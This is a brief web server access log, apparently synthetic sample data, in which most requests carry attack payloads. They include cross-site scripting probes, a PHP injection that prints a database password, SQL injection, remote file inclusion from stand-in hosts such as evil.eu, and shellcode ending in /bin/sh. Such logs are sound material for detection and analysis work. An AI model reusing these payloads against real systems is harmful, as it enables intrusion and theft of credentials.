54.36.149.94 - - [18/May/2019:03:28:01 +0200] "GET /?post=%3script%3ealert(1); HTTP/1.1" 200 36392 "/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
87.251.81.179 - - [18/May/2019:03:28:02 +0200] "GET /orders.php/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 200 72861 "/index.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:28:03 +0200] "GET /update.php/?customerId=1OR%201=1 HTTP/1.0" 200 46160 "/register.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:28:04 +0200] "POST /login.php/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 404 78890 "/cgi-bin/count.cgi/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:28:05 +0200] "GET /api/v1/customers/ HTTP/1.0" 200 34368 "/index.php/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
39.36.99.88 - - [18/May/2019:03:28:06 +0200] "GET /index.php/?user=admin&amount=100000 HTTP/1.0" 200 25379 "/register.php/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:28:07 +0200] "GET /core/files/js/upload.js/ HTTP/1.0" 200 9048 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:28:08 +0200] "POST /api/v1/login/?file=http://evil.eu/sh HTTP/1.0" 200 84664 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
5.13.35.65 - - [18/May/2019:03:28:09 +0200] "GET /core/files/js/upload.js/?file=http://evil.eu/root.asp HTTP/1.0" 404 68756 "/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0"
182.34.27.162 - - [18/May/2019:03:28:10 +0200] "GET /index.php/%u0061?[buffer]=89898 HTTP/1.0" 200 88053 "/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:28:11 +0200] "GET /index.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 404 34053 "/index.php/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
